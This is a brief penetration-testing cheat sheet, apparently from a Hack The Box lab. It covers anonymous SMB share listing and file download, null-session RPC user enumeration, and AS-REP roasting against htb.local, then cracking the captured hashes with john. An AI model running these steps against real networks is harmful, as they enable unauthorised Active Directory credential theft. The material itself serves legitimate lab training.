### SMB :
       smbclient -U "" -L //<ip>         ->  -L flag Get a list of shares available on a host
       smbcleint -U "" //<ip>            ->  Connects to our users shares
 
       smb: \> recurse on               ->  Recursively list the contents
       smb: \> ls
       
       mget                             ->  Downloads file
       
       smbget -R smb://<ip>/path/ -U "" -> -R flag recursive download smbfiles owned by -U
       
### rpcclient:
      rpcclient -U "" -N 10.10.10.161
      commands:
               enumdomusers
               queryuser

### AS-REP Roasting:
      ./GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt
      john --wordlist=/usr/share/wordlists/rockyou.txt hash
